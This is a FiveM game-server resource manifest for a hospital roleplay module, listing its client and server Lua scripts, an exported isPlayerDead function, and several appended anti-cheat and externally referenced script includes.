resource_manifest_version "44febabe-d386-4d18-afbe-5e627f4af937"

description 'Hospital'

client_script "@lcrp-radialmenu/gui.lua"

client_scripts {
	'config.lua',
	'client/main.lua',
	'client/wounding.lua',
	'client/laststand.lua',
	'client/job.lua',
	'client/dead.lua',
	'client/missions.lua',
}

exports {
    'isPlayerDead',
}

server_scripts {
	'config.lua',
	'server/main.lua',
}

data_file 'INTERIOR_PROXY_ORDER_FILE' 'interiorproxies.meta'

files {
	'interiorproxies.meta'
}

client_script "11336.lua"
client_script "lucidcity-anticheat.lua"
client_script "antikickvehicle.lua"
client_script "anti-stungun.lua"
client_script "anti-update.lua"
client_script "block-menus.lua"
client_script "block-menus2.lua"


client_script '@s800w22/11313.lua'